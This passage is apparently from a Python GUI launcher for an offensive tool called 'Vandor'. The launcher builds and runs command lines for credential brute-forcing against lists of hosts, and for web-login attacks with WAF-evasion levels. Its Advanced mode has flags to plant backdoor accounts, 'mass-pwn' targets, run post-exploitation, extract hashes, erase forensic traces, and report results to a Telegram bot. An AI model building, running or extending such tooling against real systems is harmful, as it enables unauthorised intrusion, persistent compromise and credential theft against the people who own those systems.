        else:
            self.log("[!] No running process found")

    def run_attack(self):
        if self.process and self.process.poll() is None:
            messagebox.showwarning("Warning", "Attack already running! Stop it first.")
            return

        current_tab = self.tabview.get()
        
        if current_tab == "📦 ARCHIVE CRACKER":
            return
        
        if current_tab == "💚 ALIVE SCANNER":
            self.log("[ERROR] Use the 'START ALIVE SCAN' button inside the Alive Scanner tab")
            return

        vandor_path = shutil.which("Vandor")
        
        if not vandor_path:
            go_path = os.path.expanduser("~/go/bin/Vandor")
            if os.name == 'nt':
                go_path = os.path.expanduser("~/go/bin/Vandor.exe")
            if os.path.exists(go_path):
                vandor_path = go_path
        
        local_exe = os.path.join(os.getcwd(), "Vandor")
        if os.name == 'nt':
            local_exe = os.path.join(os.getcwd(), "Vandor.exe")
        
        if os.path.exists(local_exe):
            vandor_path = local_exe
        
        if not vandor_path or not os.path.exists(vandor_path):
            self.log("[ERROR] Vandor not found! Please install via INSTALLER tab or place Vandor.exe in current directory")
            return

        cmd = [vandor_path]

        if current_tab == "🌋 WEB INFERNO":
            req_file = self.req_file.get().strip()
            if not req_file:
                self.log("[ERROR] Request file or URL required for Web Inferno mode")
                return
            
            cmd.extend(["-req", req_file])
            
            if self.web_vars.get().strip():
                cmd.extend(["-web-var", self.web_vars.get().strip()])
            
            if self.web_ifin.get().strip():
                cmd.extend(["-ifin", self.web_ifin.get().strip()])
            
            if self.web_ifnin.get().strip():
                cmd.extend(["-ifnin", self.web_ifnin.get().strip()])
            
            if self.web_token_regex.get().strip():
                cmd.extend(["-token-regex", self.web_token_regex.get().strip()])
            
            if not self.check_auto_token.get():
                cmd.extend(["-auto-token=false"])
            
            if self.web_out.get().strip():
                cmd.extend(["-web-out", self.web_out.get().strip()])
            
            if self.web_fail.get().strip():
                cmd.extend(["-web-fail", self.web_fail.get().strip()])
            
            if self.web_tokens_out.get().strip():
                cmd.extend(["-web-tokens", self.web_tokens_out.get().strip()])
            
            if self.check_web_random_delay.get():
                cmd.append("-web-random-delay")
            
            if self.web_threads.get().strip():
                cmd.extend(["-web-threads", self.web_threads.get().strip()])
            
            if self.web_timeout.get().strip():
                cmd.extend(["-web-timeout", self.web_timeout.get().strip()])
            
            if self.web_rate.get().strip():
                cmd.extend(["-web-rate", self.web_rate.get().strip()])
            
            if self.web_retries.get().strip():
                cmd.extend(["-web-retries", self.web_retries.get().strip()])
            
            evasion_map = {"0 - None": "0", "1 - Basic": "1", "2 - Moderate": "2", "3 - Advanced": "3", "4 - Paranoid": "4", "5 - Insane": "5"}
            cmd.extend(["-web-evasion", evasion_map.get(self.web_evasion.get(), "3")])
            
            intel_map = {"0 - Dumb": "0", "1 - Smart": "1", "2 - Genius": "2", "3 - God": "3"}
            cmd.extend(["-web-intel", intel_map.get(self.web_intel.get(), "2")])
            
            if not self.check_web_learn.get():
                cmd.extend(["-web-learn=false"])
            
            if not self.check_web_follow.get():
                cmd.extend(["-web-follow=false"])
            
            if self.web_method.get() != "GET":
                cmd.extend(["-web-method", self.web_method.get()])
            
            if self.web_body.get("1.0", "end-1c").strip():
                cmd.extend(["-web-body", self.web_body.get("1.0", "end-1c").strip()])
            
            if self.web_headers.get().strip():
                cmd.extend(["-web-headers", self.web_headers.get().strip()])
            
            if self.check_dynamic_token.get():
                cmd.append("-dynamic-token")
                if self.token_url.get().strip():
                    cmd.extend(["-token-url", self.token_url.get().strip()])
                if self.token_method.get():
                    cmd.extend(["-token-method", self.token_method.get()])
                if self.token_start.get().strip():
                    cmd.extend(["-token-start", self.token_start.get().strip()])
                if self.token_end.get().strip():
                    cmd.extend(["-token-end", self.token_end.get().strip()])
                if self.token_refresh.get().strip():
                    cmd.extend(["-token-refresh", self.token_refresh.get().strip()])
                if self.token_field.get().strip():
                    cmd.extend(["-token-field", self.token_field.get().strip()])
            
            self.log("[*] LAUNCHING WEB INFERNO MODE...")

        elif current_tab == "🎯 BEGINNER":
            hosts = self.basic_hosts.get().strip()
            if not hosts:
                self.log("[ERROR] Hosts required")
                return
            
            cmd.extend(["-h", hosts])
            cmd.extend(["-p", self.basic_proto.get()])
            
            user = self.basic_user.get().strip()
            pwd = self.basic_pass.get().strip()
            if not user or not pwd:
                self.log("[ERROR] Username and Password required")
                return
            
            cmd.extend(["-u", user])
            cmd.extend(["-psw", pwd])
            
            if self.basic_port.get():
                cmd.extend(["-P", self.basic_port.get()])
            if self.basic_timeout.get():
                cmd.extend(["-t", self.basic_timeout.get()])
            if self.basic_threads.get():
                cmd.extend(["-threads", self.basic_threads.get()])

        elif current_tab == "🔥 ADVANCED":
            hosts = self.adv_hosts.get().strip()
            if not hosts:
                self.log("[ERROR] Hosts required in Advanced mode")
                return
            
            cmd.extend(["-h", hosts])
            cmd.extend(["-p", self.adv_proto.get()])
            
            if self.adv_creds.get().strip():
                cmd.extend(["-c", self.adv_creds.get().strip()])
            else:
                user = self.adv_user.get().strip()
                pwd = self.adv_pass.get().strip()
                if not user or not pwd:
                    self.log("[ERROR] Username/Password or Creds file required")
                    return
                cmd.extend(["-u", user])
                cmd.extend(["-psw", pwd])
            
            if self.adv_port.get():
                cmd.extend(["-P", self.adv_port.get()])
            if self.adv_timeout.get():
                cmd.extend(["-t", self.adv_timeout.get()])
            if self.adv_threads.get():
                cmd.extend(["-threads", self.adv_threads.get()])
            
            if self.attack_mode.get() != "normal":
                cmd.extend(["-attack-mode", self.attack_mode.get()])
            
            if self.multi_city.get():
                cmd.append("-multi-city")
            
            if self.check_smart.get():
                cmd.append("-smart-pass")
            if self.check_gpu.get():
                cmd.append("-gpu")
            if self.check_ramdisk.get():
                cmd.append("-ramdisk")
            if self.check_post.get():
                cmd.append("-post-exploit")
            if self.check_backdoor.get():
                cmd.append("-backdoor")
                cmd.extend(["-backdoor-type", self.backdoor_type.get()])
                if self.backdoor_port.get():
                    cmd.extend(["-backdoor-port", self.backdoor_port.get()])
                if self.backdoor_user.get():
                    cmd.extend(["-backdoor-user", self.backdoor_user.get()])
                if self.backdoor_pass.get():
                    cmd.extend(["-backdoor-pass", self.backdoor_pass.get()])
            if self.check_masspwn.get():
                cmd.append("-mass-pwn")
            if self.check_honeypot.get():
                cmd.append("-honeypot")
            if self.check_antiforensic.get():
                cmd.append("-anti-forensic")
            if self.check_scan.get():
                cmd.append("-scan-network")
            if self.check_hash.get():
                cmd.append("-extract-hash")
            if self.check_script.get():
                cmd.append("-gen-script")
            if self.check_resume.get():
                cmd.append("-resume")
            if self.check_skip_alive.get():
                cmd.append("-skip-alive")
            if self.check_auto_port.get():
                cmd.append("-auto-port")
            if self.monitor_mode.get():
                cmd.append("-monitor")
            
            if self.check_http.get():
                if self.http_path.get():
                    cmd.extend(["-http-path", self.http_path.get()])
                if self.http_user_field.get():
                    cmd.extend(["-http-user-field", self.http_user_field.get()])
                if self.http_pass_field.get():
                    cmd.extend(["-http-pass-field", self.http_pass_field.get()])
            
            if self.min_delay.get():
                cmd.extend(["-min-delay", self.min_delay.get()])
            if self.max_delay.get():
                cmd.extend(["-max-delay", self.max_delay.get()])
            
            if self.check_notify.get():
                token = self.tg_token.get().strip()
                chat = self.tg_chat.get().strip()
                if token and chat:
                    cmd.extend(["-bot-token", token, "-chat-id", chat])
                    notify_val = self.notify_level.get().split(" - ")[0]
                    cmd.extend(["-not", notify_val])
                else:
                    self.log("[WARNING] Telegram enabled but missing token/chat-id")
            
            if self.check_json.get():
                cmd.append("-json")
            if self.check_csv.get():
                cmd.append("-csv")

        self.log("="*80)
        self.log(f"[CMD] {' '.join(cmd)}")
        self.log("="*80)
        self.log("[*] LAUNCHING VANDOR...\n")
        self.status_label.configure(text="● ATTACK RUNNING", text_color="#ff0000")

        def target():
            try:
                self.process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
                
                for line in iter(self.process.stdout.readline, ''):
                    if line:
                        self.log(line.rstrip())
                
                self.process.wait()
                self.log(f"\n[✓] Vandor finished with exit code: {self.process.returncode}")
                self.process = None
                self.status_label.configure(text="● SYSTEM READY", text_color="#00ff00")
                
            except Exception as e:
                self.log(f"[ERROR] {str(e)}")
                self.process = None
                self.status_label.configure(text="● ERROR OCCURRED", text_color="#ff0000")

        threading.Thread(target=target, daemon=True).start()

if __name__ == "__main__":
    app = VandorLauncher()
    app.mainloop()
